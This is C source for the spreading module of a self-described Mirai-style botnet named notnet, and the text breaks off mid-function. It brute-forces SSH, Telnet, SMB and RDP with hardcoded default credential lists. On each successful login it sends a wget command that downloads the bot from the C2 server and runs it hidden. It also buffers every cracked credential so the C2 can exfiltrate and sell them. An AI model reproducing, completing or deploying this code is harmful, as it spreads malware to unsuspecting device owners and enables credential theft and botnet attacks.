/*
 * notnet - Modern Mirai-Style Botnet
 * spread.c - Multi-vector spreading module
 *
 * Targets: SSH, Telnet, SMB, Redis, RDP
 */
#include "spread.h"
#include "util.h"
#include "protocol.h"
#include "lotl.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <pthread.h>

/* ── Credential-log buffer (#90) ─────────────────────────── */
/* Smash-and-grab log-sale monetization. Every successful brute-force
 * credential is buffered here (bounded, mutex-protected) so the C2 can
 * pull the whole harvest via the `exfil_creds` command and sell it.
 * Each entry is one line "proto|ip|port|user|pass", capped at
 * CRED_LOG_ENTRY_MAX bytes.
 *
 * Overflow policy: DROP-NEWEST with a log_warn. The buffer is a fixed
 * array that never grows; once CRED_LOG_MAX_ENTRIES is reached, a fresh
 * credential is discarded rather than evicting an older one the C2 has
 * not yet pulled (the freshest entry is the most expendable — the older
 * harvest already accumulated is kept). The buffer is drained (and
 * cleared) by exfil_creds, so capacity resets to zero after each pull.
 *
 * Thread safety: scan threads (scan_thread_fn) and the C2 command loop
 * both record/drain creds, so every access is gated by g_creds_mutex —
 * the same static-PTHREAD_MUTEX_INITIALIZER pattern as src/proxy.c. */
#define CRED_LOG_MAX_ENTRIES 256
#define CRED_LOG_ENTRY_MAX   256

static char g_creds[CRED_LOG_MAX_ENTRIES][CRED_LOG_ENTRY_MAX];
static unsigned int g_creds_count = 0;
static pthread_mutex_t g_creds_mutex = PTHREAD_MUTEX_INITIALIZER;

void spread_cred_record(const char *proto, const char *ip, uint16_t port,
                        const char *user, const char *pass) {
    if (!proto || !ip || !user || !pass) return;

    /* One line per entry. Every dynamic field is precision-capped so the
     * total always fits CRED_LOG_ENTRY_MAX (fixed separators ~10 bytes +
     * 16 proto + 32 ip + 5 port + 80 user + 80 pass). */
    char line[CRED_LOG_ENTRY_MAX];
    int len = snprintf(line, sizeof(line), "%.16s|%.32s|%u|%.80s|%.80s",
                       proto, ip, (unsigned)port, user, pass);
    if (len < 0 || (size_t)len >= sizeof(line)) return;

    pthread_mutex_lock(&g_creds_mutex);
    if (g_creds_count >= CRED_LOG_MAX_ENTRIES) {
        /* DROP-NEWEST: buffer full — discard this entry, keep the harvest. */
        log_warn("cred-log: buffer full (%u entries), dropping newest credential",
                 g_creds_count);
        pthread_mutex_unlock(&g_creds_mutex);
        return;
    }
    memcpy(g_creds[g_creds_count], line, (size_t)len + 1);
    g_creds_count++;
    pthread_mutex_unlock(&g_creds_mutex);
}

unsigned int spread_cred_count(void) {
    pthread_mutex_lock(&g_creds_mutex);
    unsigned int c = g_creds_count;
    pthread_mutex_unlock(&g_creds_mutex);
    return c;
}

/* Drain the whole log into a caller-free'd heap buffer (one entry per
 * line, NUL-terminated) and clear the buffer. Returns 0 on success with
 * *out set and *out_len = byte count (excluding the NUL), -1 on
 * allocation failure. Thread-safe. */
int spread_creds_drain(char **out, size_t *out_len) {
    if (!out || !out_len) return -1;

    pthread_mutex_lock(&g_creds_mutex);
    size_t cap = (size_t)g_creds_count * CRED_LOG_ENTRY_MAX + 1;
    char *buf = (char *)malloc(cap);
    if (!buf) {
        pthread_mutex_unlock(&g_creds_mutex);
        return -1;
    }
    size_t pos = 0;
    for (unsigned int i = 0; i < g_creds_count; i++) {
        size_t l = strlen(g_creds[i]);
        if (pos + l + 1 >= cap) break; /* belt-and-braces; cannot trigger */
        memcpy(buf + pos, g_creds[i], l);
        pos += l;
        buf[pos++] = '\n';
    }
    buf[pos] = '\0';
    *out = buf;
    *out_len = pos;
    g_creds_count = 0;
    pthread_mutex_unlock(&g_creds_mutex);
    return 0;
}

/* ── Default credentials ───────────────────────────────────── */
/* Mirai-style credential pool — can be extended via C2 */
static const char *default_users[] = {
    "admin", "root", "user", "test", "guest",
    "pi", "ubuntu", "deploy", "ftp", "www",
    "oracle", "postgres", "mysql", "mssql", "redis",
    "telnet", "default", "support", "info", "operator",
    NULL
};

static const char *default_passes[] = {
    "admin", "password", "123456", "root", "toor",
    "pass", "test", "guest", "12345", "1234",
    "123456789", "letmein", "welcome", "monkey", "qwerty",
    "abc123", "login", "default", "111111", "666666",
    "123", "123456789", "changeme", "123123", "password1",
    NULL
};

/* ── Helper ─────────────────────────────────────────────────── */
/* SECURITY FIX (#15): send_command now actually sends commands over an
 * open socket instead of just logging. For SSH/Telnet this sends the
 * command followed by a newline. */
static void send_command(int sock, const char *service, const char *cmd) {
    log_info("send_cmd: %s '%s'", service, cmd);
    if (sock >= 0) {
        char cmd_line[1024];
        int len = snprintf(cmd_line, sizeof(cmd_line), "%s\r\n", cmd);
        if (len < (int)sizeof(cmd_line)) {
            send(sock, cmd_line, len, 0);
        }
    }
}

/* ── Connection helpers ─────────────────────────────────────── */
static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    /* SECURITY FIX (#3): Use inet_pton + getaddrinfo fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results).
     * SECURITY FIX (#54): Use getaddrinfo instead of inet_addr to avoid
     * accepting 255.255.255.255 as valid (inet_addr returns INADDR_NONE
     * for both error and that address). */
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        struct addrinfo hints = {0}, *res;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(ip, NULL, &hints, &res) != 0) {
            close(sock);
            return -1;
        }
        struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
        addr.sin_addr = sin->sin_addr;
        freeaddrinfo(res);
    }
    
    int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    /* SECURITY FIX (#50): select() reports writability for refused
     * connections too. Check SO_ERROR to distinguish open ports from
     * RST/refused hosts — otherwise refused hosts are reported as open. */
    int so_error = 0;
    socklen_t slen = sizeof(so_error);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &slen) != 0) {
        close(sock);
        return -1;
    }
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    /* Restore blocking */
    fcntl(sock, F_SETFL, flags);
    return sock;
}

/* ── SSH Spreading ───────────────────────────────────────────── */
/* Timeout-aware SSH login — uses provided timeout_ms instead of SCAN_TIMEOUT_MS.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* Read banner. Initialized to {0} so a select() timeout (no banner on
     * the wire, e.g. non-SSH port) cannot feed uninitialized stack bytes
     * to strstr() below (CWE-457 #104). */
    char banner[256] = {0};
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;

    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        int n = (int)recv(sock, banner, sizeof(banner) - 1, 0);
        if (n > 0) banner[n] = '\0';
    }

    /* Check for SSH-2 banner (more secure than SSH-1) */
    if (strstr(banner, "SSH-2") == NULL) {
        close(sock);
        return -1;
    }

    /* Send SSH banner */
    char our_banner[256];
    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
    send(sock, our_banner, strlen(our_banner), 0);

    /* Read server banner or prompt */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);

    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);

    /* Read password prompt */
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);

    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);

    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        /* Check for successful login indicators */
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
            success = 1;
        }
    }

    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms);
char *scan_ports(const char *target, uint16_t *ports, int port_count);

/* Forward declarations for static functions defined later */
static int smb1_negotiate(int sock);
static int smb1_session_setup(int sock, const char *user, const char *pass, uint16_t *out_uid);
static int rdp_connect(int sock);
static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass);
static int rdp_read_cred_response(int sock);
static int rdp_send_final_control(int sock);
static int rdp_read_final_control_response(int sock);
static int rdp_send_share_key(int sock);

int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->ssh_enabled) return -1;
    
    log_info("SSH: brute-forcing %s:%d", ip, port);
    
    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    /* Try default credentials */
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock_fd = try_login_ssh_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock_fd >= 0) {
                log_info("SSH: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                /* #90: harvest the credential for the log-sale model. */
                spread_cred_record("ssh", ip, port, default_users[u], default_passes[p]);
                
                /* Download and install binary */
                char cmd[1024];
                char dl_url[1024];
                snprintf(dl_url, sizeof(dl_url),
                    "http://%.250s:%d/bot/%s",
                    bot->c2_http.server, PAYLOAD_DL_PORT, "notnet");
                /* %.500s: dl_url is already capped at ~280 bytes by the
                 * .250s precision above, but GCC can't see through the
                 * intermediate buffer, so cap again to silence truncation. */
                snprintf(cmd, sizeof(cmd),
                    "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
                    dl_url);
                /* SECURITY FIX (#15): Send command over the established socket */
                send_command(sock_fd, "ssh", cmd);
                close(sock_fd);
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── Telnet Spreading ─────────────────────────────────────── */
/* Timeout-aware telnet login — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* SECURITY FIX (#133): wait for the LOGIN PROMPT before sending the
     * username. Real telnetd (busybox/inetutils) first sends the IAC
     * WILL/WONT negotiation burst and WAITS for the client's response —
     * only then does it send "login:". The old code never answered the
     * negotiation, so the prompt never arrived and the client desynced.
     * The emulator's lenient telnet masked this. */
    char banner[512] = {0};
    int blen = 0;
    int iac_replied = 0;
    fd_set fds;
    struct timeval tv;
    long waited_ms = 0;
    while (blen < (int)sizeof(banner) - 1 && waited_ms < 4000) {
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 200000;   /* 200ms polls */
        int sr = select(sock + 1, &fds, NULL, NULL, &tv);
        if (sr <= 0) {
            waited_ms += 200;
            continue;
        }
        int n = (int)recv(sock, banner + blen, sizeof(banner) - 1 - blen, 0);
        if (n <= 0) break;
        blen += n;
        banner[blen] = '\0';
        /* Answer the telnet IAC negotiation once (decline WILL/WONT,
         * refuse DO/DONT) so the server proceeds to the login prompt. */
        if (!iac_replied && memchr(banner, 0xff, (size_t)blen)) {
            char reply[64];
            int rl = 0;
            for (int i = 0; i < blen - 2 && rl < (int)sizeof(reply) - 3; i++) {
                if ((unsigned char)banner[i] == 0xff) {
                    unsigned char cmd = (unsigned char)banner[i + 1];
                    unsigned char opt = (unsigned char)banner[i + 2];
                    if (cmd == 0xfb || cmd == 0xfc) {      /* WILL/WONT */
                        reply[rl++] = (char)0xff;
                        reply[rl++] = (char)0xfe;           /* DONT */
                        reply[rl++] = (char)opt;
                    } else if (cmd == 0xfd || cmd == 0xfe) { /* DO/DONT */
                        reply[rl++] = (char)0xff;
                        reply[rl++] = (char)0xfc;           /* WONT */
                        reply[rl++] = (char)opt;
                    }
                    i += 2;
                }
            }
            if (rl > 0) {
                send(sock, reply, (size_t)rl, 0);
                iac_replied = 1;
            }
        }
        if (strstr(banner, "login:") || strstr(banner, "Login:") ||
            strstr(banner, "Username") || strstr(banner, "username")) {
            break;
        }
    }
    if (!(strstr(banner, "login:") || strstr(banner, "Login:") ||
          strstr(banner, "Username") || strstr(banner, "username"))) {
        close(sock);
        return -1;
    }

    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);

    /* Read until the password prompt */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    int rlen = 0;
    waited_ms = 0;
    while (rlen < (int)sizeof(resp) - 1 && waited_ms < 4000) {
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 200000;
        int sr = select(sock + 1, &fds, NULL, NULL, &tv);
        if (sr <= 0) {
            waited_ms += 200;
            continue;
        }
        int n = (int)recv(sock, resp + rlen, sizeof(resp) - 1 - rlen, 0);
        if (n <= 0) break;
        rlen += n;
        resp[rlen] = '\0';
        if (strstr(resp, "assword") || strstr(resp, "password")) {
            break;
        }
    }

    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);

    /* Read response — accumulate until a shell marker appears. Real
     * telnetd sends a LONG MOTD (the Debian copyright notice exceeds 256
     * bytes), so the buffer is a rolling tail: each fresh chunk is
     * checked for markers and the stored window slides. Confirmed
     * failure markers break out fast so the pool isn't slowed 8x. */
    int success = 0;
    int rlen2 = 0;
    waited_ms = 0;
    {
        char chunk[128];
        while (waited_ms < 8000) {
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            tv.tv_sec = 0;
            tv.tv_usec = 200000;
            int sr = select(sock + 1, &fds, NULL, NULL, &tv);
            if (sr <= 0) {
                waited_ms += 200;
                continue;
            }
            int n = (int)recv(sock, chunk, sizeof(chunk) - 1, 0);
            if (n <= 0) break;
            chunk[n] = '\0';
            if (memchr(chunk, '$', (size_t)n) || memchr(chunk, '#', (size_t)n) ||
                strstr(chunk, "OK")) {
                success = 1;
                break;
            }
            if (strstr(chunk, "incorrect") || strstr(chunk, "denied") ||
                strstr(chunk, "Invalid") || strstr(chunk, "invalid")) {
                break;
            }
            if (rlen2 + n >= (int)sizeof(resp) - 1) {
                /* roll the window: keep the last 96 bytes */
                memmove(resp, resp + 96, 96);
                rlen2 = 96;
            }
            memcpy(resp + rlen2, chunk, (size_t)n);
            rlen2 += n;
            resp[rlen2] = '\0';
        }
    }

    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

/* Timeout-aware SMB login — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* SMB1 negotiation */
    if (smb1_negotiate(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Session setup with credentials */
    uint16_t uid = 0;
    if (smb1_session_setup(sock, user, pass, &uid) != 0) {
        close(sock);
        return -1;
    }

    log_info("SMB: session established as uid=%d", uid);
    return sock;
}

/* Timeout-aware RDP login — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* Full RDP handshake */
    if (rdp_connect(sock) != 0) {
        close(sock);
        return -1;
    }

    /* Send credentials with key exchange */
    if (rdp_send_cred_key_exchange(sock, user, pass) <= 0) {
        close(sock);
        return -1;
    }

    /* Read auth response */
    if (rdp_read_cred_response(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Final control */
    if (rdp_send_final_control(sock) <= 0) {
        close(sock);
        return -1;
    }

    if (rdp_read_final_control_response(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Share key */
    rdp_send_share_key(sock);

    log_info("RDP: authenticated to %s:%d as %s", ip, port, user);
    return sock;
}

/* Timeout-aware port scan — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    close(sock);

    return 0;
}

int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->telnet_enabled) return -1;

    log_info("Telnet: brute-forcing %s:%d", ip, port);

    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock_fd = try_login_telnet_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock_fd >= 0) {
                log_info("Telnet: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                /* #90: harvest the credential for the log-sale model. */
                spread_cred_record("telnet", ip, port, default_users[u], default_passes[p]);
                
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
                    bot->c2_http.server, PAYLOAD_DL_PORT);
                /* SECURITY FIX (#15): Send command over the established socket */
                send_command(sock_fd, "telnet", cmd);
                close(sock_fd);
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── SMB Spreading ────────────────────────────────────────── */

/* ── SMB1 Protocol Helpers ────────────────────────────────── */
/* SMB1 over TCP port 445 (no NetBIOS session layer).
 * Header: 0xFF 0x53 0x4D 0x42 (4 bytes) + 32-byte SMB header. */

/* Build SMB1 header (32 bytes after protocol prefix) */
static void smb1_build_header(uint8_t *buf, uint8_t cmd, uint16_t uid, uint16_t mid) {
    buf[0] = 0xFF; /* Protocol prefix */
    buf[1] = 0x53; /* SMB */
    buf[2] = 0x4D;
    buf[3] = 0x42;

    buf[4] = cmd;  /* Command */
    buf[5] = 0x18; /* Flags: canonical path cases, case sensitive */
    buf[6] = 0x00;
    buf[7] = 0x00; /* Flags2: 16-bit PID, long names supported */
    buf[8] = 0x01;
    buf[9] = 0x00;
    buf[10] = 0x00;
    buf[11] = 0x00;
    buf[12] = 0x00;
    buf[13] = 0x00;
    buf[14] = 0x00;
    buf[15] = 0x00; /* Security features (8 bytes, zeroed) */
    buf[16] = 0x00;
    buf[17] = 0x00;
    buf[18] = 0x00;
    buf[19] = 0x00;
    buf[20] = 0x00;
    buf[21] = 0x00;
    buf[22] = 0x00;
    buf[23] = 0x00;
    buf[24] = 0x00;
    buf[25] = 0x00; /* PID high (2 bytes) */
    buf[26] = 0x00;
    buf[27] = 0x00; /* PID low (2 bytes) */
    buf[28] = 0x00;
    buf[29] = uid & 0xFF;  /* UID low */
    buf[30] = (uid >> 8) & 0xFF; /* UID high */
    buf[31] = mid & 0xFF;  /* MID low */
    buf[32] = (mid >> 8) & 0xFF; /* MID high */
}

/* Send SMB1 packet and read response. Returns bytes received, -1 on error. */
static int smb1_transaction(int sock, uint8_t *params, int param_len,
                            uint8_t *data, int data_len,
                            uint8_t *resp_buf, int resp_buf_size,
                            uint16_t uid, uint16_t mid) {
    /* Total packet: 4-byte prefix + 32-byte header + params + data */
    int total = 36 + param_len + data_len;
    uint8_t *packet = (uint8_t *)malloc(total);
    if (!packet) return -1;

    /* Build header */
    smb1_build_header(packet, 0, uid, mid);

    /* Copy params and data after header */
    if (param_len > 0) memcpy(packet + 36, params, param_len);
    if (data_len > 0) memcpy(packet + 36 + param_len, data, data_len);

    /* Send */
    int sent = send(sock, packet, total, 0);
    if (sent <= 0) {
        free(packet);
        return -1;
    }
    free(packet);

    /* Read response header first (4 bytes prefix + at least 32 header) */
    int received = recv(sock, resp_buf, 4, 0);
    if (received != 4 || resp_buf[0] != 0xFF) return -1;

    /* Read rest of header */
    int remaining = 32;
    int offset = 4;
    while (remaining > 0) {
        int n = recv(sock, resp_buf + offset, remaining, 0);
        if (n <= 0) return -1;
        offset += n;
        remaining -= n;
    }

    /* Read params and data based on response length fields */
    /* SMB1 response: word count at offset 36, byte count at offset 38 (LE) */
    if (offset < 38) return -1;

    /* For simplicity, read remaining data with timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    int max_read = resp_buf_size - offset;
    if (max_read > 0) {
        select(sock + 1, &fds, NULL, NULL, &tv);
        int n = recv(sock, resp_buf + offset, max_read, 0);
        if (n > 0) offset += n;
    }

    return offset;
}

/* SMB1 negotiation — returns 0 on success */
static int smb1_negotiate(int sock) {
    /* SMB_COM_NEGOTIATE: word count = 0, no params, no data */
    uint8_t params[2] = {0, 0}; /* Word count = 0, padding */
    uint8_t resp[128];
    memset(resp, 0, sizeof(resp));
    /* Byte count = 0 */
    return smb1_transaction(sock, params, 2, NULL, 0, resp, sizeof(resp), 0, 1);
}

/* SMB1 session setup with username/password (ASCII) */
static int smb1_session_setup(int sock, const char *user, const char *pass,
                               uint16_t *out_uid) {
    /* SMB_COM_SESSION_SETUP_ANDX:
     * Word count: 12 (0x0C)
     * Max buffer, max mux, vcid, password length, account name, primary group
     * Then: Native OS string, native language, password, account name, primary group */

    /* Build parameters */
    uint8_t params[24] = {
        0x12, /* Word count = 18 */
        0xFF, /* AndX command = no further command */
        0x00, /* Reserved */
        0x00, 0x00, /* AndX offset */
        0x00, 0x00, 0x00, 0x00, /* Max buffer (4 bytes) */
        0x00, 0x00, 0x00, 0x00, /* Max MUX (4 bytes) */
        0x00, 0x00, /* VCID */
    };

    /* Password length (2 bytes LE) */
    int pass_len = strlen(pass);
    params[12] = pass_len & 0xFF;
    params[13] = (pass_len >> 8) & 0xFF;

    /* Account name length */
    int user_len = strlen(user);
    params[14] = user_len & 0xFF;
    params[15] = (user_len >> 8) & 0xFF;

    /* Primary group length */
    params[16] = 0;
    params[17] = 0;

    /* Native OS: "Linux" */
    /* Native language: 0x0000 */

    /* Data section */
    char data[512];
    int dpos = 0;

    /* Password (null-terminated) */
    memcpy(data + dpos, pass, pass_len);
    dpos += pass_len;
    data[dpos++] = 0; /* null terminator */

    /* Account name (null-terminated) */
    memcpy(data + dpos, user, user_len);
    dpos += user_len;
    data[dpos++] = 0;

    /* Primary group (null-terminated) */
    data[dpos++] = 0;

    /* Native OS string (null-terminated) */
    const char *native_os = "Linux";
    int os_len = strlen(native_os);
    memcpy(data + dpos, native_os, os_len);
    dpos += os_len;
    data[dpos++] = 0;

    /* Native language (2 bytes LE, 0x0000 = English) */
    data[dpos++] = 0x00;
    data[dpos++] = 0x00;

    int total_data = dpos;

    uint8_t resp[512];
    memset(resp, 0, sizeof(resp));

    int ret = smb1_transaction(sock, params, sizeof(params),
                                (uint8_t *)data, total_data, resp, sizeof(resp), 0, 2);

    if (ret > 36) {
        /* Extract UID from response (offset 30-31 in SMB header) */
        *out_uid = resp[30] | (resp[31] << 8);
        return 0;
    }
    return -1;
}

/* SMB1 tree connect to a share */
static int smb1_tree_connect(int sock, const char *path, uint16_t uid,
                              uint16_t *out_tid) {
    /* SMB_COM_TREE_CONNECT:
     * Word count: 4
     * AndX command, reserved, max reply, ftqos, patqos
     * Then: flags(LE), password length, password, path, service */

    uint8_t params[12] = {
        0x04, /* Word count */
        0xFF, /* AndX = none */
        0x00, /* Reserved */
        0x00, 0x00, /* Max reply */
        0x01, 0x00, 0x00, 0x00, /* FTQOS, PATQOS */
    };

    /* Data: flags LE, password len LE, password, path, service */
    char data[512];
    int dpos = 0;

    /* Flags: 0x0008 = password mode */
    data[dpos++] = 0x08;
    data[dpos++] = 0x00;

    /* Password length */
    data[dpos++] = 0x00;
    data[dpos++] = 0x00;

    /* Password (empty for most SMB shares) */
    data[dpos++] = 0;

    /* Path (null-terminated, uppercase for Windows shares) */
    /* Convert path to uppercase */
    char upper_path[256];
    strncpy(upper_path, path, sizeof(upper_path) - 1);
    upper_path[sizeof(upper_path) - 1] = '\0';
    for (int i = 0; upper_path[i]; i++) {
        if (upper_path[i] >= 'a' && upper_path[i] <= 'z') {
            upper_path[i] = upper_path[i] - 'a' + 'A';
        }
    }
    int path_len = strlen(upper_path);
    memcpy(data + dpos, upper_path, path_len);
    dpos += path_len;
    data[dpos++] = 0;

    /* Service: "DISK" */
    const char *service = "DISK";
    int svc_len = strlen(service);
    memcpy(data + dpos, service, svc_len);
    dpos += svc_len;
    data[dpos++] = 0;

    uint8_t resp[512];
    memset(resp, 0, sizeof(resp));

    int ret = smb1_transaction(sock, params, sizeof(params),
                                (uint8_t *)data, dpos, resp, sizeof(resp), uid, 3);

    if (ret > 36) {
        /* TID is at offset 28-29 in SMB header */
        *out_tid = resp[28] | (resp[29] << 8);
        return 0;
    }
    return -1;
}

/* SMB1 write to file */
static int smb1_write_file(int sock, uint16_t /* tid */, uint16_t uid, uint16_t mid,
                            const char *fname, const uint8_t *data, int data_len) {
    /* SMB_COM_WRITE_ANDX: write to file by name */
    /* Response buffer: smb1_transaction recv()s into it; passing NULL made
     * the first recv(sock, NULL, 4, 0) EFAULT and resp_buf[0] dereferenced
     * NULL — SMB payload deploy ALWAYS failed (#109, same class as the
     * smb1_negotiate fix b2e57e3). */
    uint8_t resp[512] = {0};
    /* Word count: 14 */
    uint8_t params[28] = {
        0x0E, /* Word count */
        0xFF, /* AndX = none */
        0x00, /* Reserved */
        0x00, 0x00, /* AndX offset */
        0x00, 0x00, 0x00, 0x00, /* File handle (4 bytes) */
        0x00, 0x00, /* Offset (2 bytes) */
    };

    /* Data section */
    char data_section[1024];
    int dpos = 0;

    /* Remaining (2 bytes LE) */
    data_section[dpos++] = data_len & 0xFF;
    data_section[dpos++] = (data_len >> 8) & 0xFF;

    /* Open mode (2 bytes) */
    data_section[dpos++] = 0x01; /* Overwrite if exists */
    data_section[dpos++] = 0x00;

    /* Write offset (4 bytes LE) */
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;

    /* Write timeout (4 bytes LE) */
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;

    /* Remaining (2 bytes) */
    data_section[dpos++] = data_len & 0xFF;
    data_section[dpos++] = (data_len >> 8) & 0xFF;

    /* File name (DOS format, null-terminated) */
    char dos_fname[256];
    strncpy(dos_fname, fname, sizeof(dos_fname) - 1);
    dos_fname[sizeof(dos_fname) - 1] = '\0';
    for (int i = 0; dos_fname[i]; i++) {
        if (dos_fname[i] >= 'a' && dos_fname[i] <= 'z') {
            dos_fname[i] = dos_fname[i] - 'a' + 'A';
        }
    }
    int fn_len = strlen(dos_fname);
    memcpy(data_section + dpos, dos_fname, fn_len);
    dpos += fn_len;
    data_section[dpos++] = 0;

    /* Actual data to write */
    memcpy(data_section + dpos, data, data_len);
    dpos += data_len;

    int ret = smb1_transaction(sock, params, sizeof(params),
                                (uint8_t *)data_section, dpos,
                                resp, sizeof(resp), uid, mid);
    return (ret > 36) ? 0 : -1;
}

/* SMB upload payload and deploy to Windows share */
static int smb_deploy_payload(int sock, uint16_t tid, uint16_t uid, uint16_t mid,
                               notnet_bot_t *bot, const char *ip) {
    /* Download payload to temp file */
    char dl_url[512];
    char tmp_path[256];
    snprintf(dl_url, sizeof(dl_url),
             "http://%s:%d/bot/notnet",
             bot->c2_http.server, PAYLOAD_DL_PORT);
